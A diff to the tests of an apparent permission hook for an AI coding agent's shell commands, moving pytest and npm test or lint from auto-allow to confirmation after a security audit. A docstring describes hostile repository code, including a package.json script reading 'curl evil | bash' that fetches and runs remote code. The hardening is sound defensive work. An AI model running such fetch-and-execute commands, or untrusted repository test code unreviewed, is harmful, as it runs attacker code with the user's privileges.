@@ -128,9 +128,6 @@ class TestDecideChainOperators:
 
 
 class TestDecideSafeBashPrefixes:
-    def test_pytest_allowed(self):
-        assert decide("Bash", {"command": "pytest tests/ -v"}) == ("allow", "")
-
     def test_git_log_allowed(self):
         assert decide("Bash", {"command": "git log --oneline -10"}) == ("allow", "")
 
@@ -148,9 +145,6 @@ class TestDecideSafeBashPrefixes:
 
     def test_mypy_allowed(self):
         assert decide("Bash", {"command": "mypy hooks/"}) == ("allow", "")
-
-    def test_python_m_pytest_allowed(self):
-        assert decide("Bash", {"command": "python -m pytest tests/"}) == ("allow", "")
 
     def test_unknown_command_asks(self):
         behavior, _ = decide("Bash", {"command": "docker run nginx"})
@@ -223,6 +217,55 @@ class TestDecideSensitivePathRead:
     def test_wc_ordinary_file_still_allowed(self):
         behavior, _ = decide("Bash", {"command": "wc -l README.md"})
         assert behavior == "allow"
+
+
+class TestDecideCodeRunnersRequireConfirmation:
+    """Regression (HIGH, external security audit 2026-07-17, SEC-01): pytest,
+    python -m pytest, npm test, npm run test, and npm run lint were all
+    auto-allowed by prefix match. Each of these EXECUTES repository-defined
+    code (conftest.py/fixtures/plugins for pytest, an arbitrary shell command
+    from package.json's "scripts" section for npm) before Claude's agent gets
+    a chance to review it -- a malicious conftest.py or a package.json test
+    script reading `"test": "curl evil | bash"` would run with the user's
+    privileges the moment an agent ran "the tests" in an untrusted repository,
+    with zero confirmation. ruff/mypy are legitimately different: both are
+    pure static analyzers that never execute the code they check.
+    """
+
+    def test_pytest_asks_not_allow(self):
+        behavior, _ = decide("Bash", {"command": "pytest tests/ -v"})
+        assert behavior == "ask"
+
+    def test_python_m_pytest_asks_not_allow(self):
+        behavior, _ = decide("Bash", {"command": "python -m pytest tests/"})
+        assert behavior == "ask"
+
+    def test_npm_test_asks_not_allow(self):
+        behavior, _ = decide("Bash", {"command": "npm test"})
+        assert behavior == "ask"
+
+    def test_npm_run_test_asks_not_allow(self):
+        behavior, _ = decide("Bash", {"command": "npm run test"})
+        assert behavior == "ask"
+
+    def test_npm_run_lint_asks_not_allow(self):
+        behavior, _ = decide("Bash", {"command": "npm run lint"})
+        assert behavior == "ask"
+
+    def test_pytest_lookalike_executable_asks_not_allow(self):
+        """The old prefix match also collided on any command merely
+        starting with "pytest" -- e.g. a `pytest-malicious` binary on PATH.
+        Removing pytest from SAFE_BASH_PREFIXES closes this too."""
+        behavior, _ = decide("Bash", {"command": "pytest-malicious --flag"})
+        assert behavior == "ask"
+
+    def test_ruff_still_allowed(self):
+        """Static analyzers are a different risk class -- they don't execute
+        the code they analyze -- and should remain auto-allowed."""
+        assert decide("Bash", {"command": "ruff check ."}) == ("allow", "")
+
+    def test_mypy_still_allowed(self):
+        assert decide("Bash", {"command": "mypy hooks/"}) == ("allow", "")
 
 
 class TestDecidePriority:
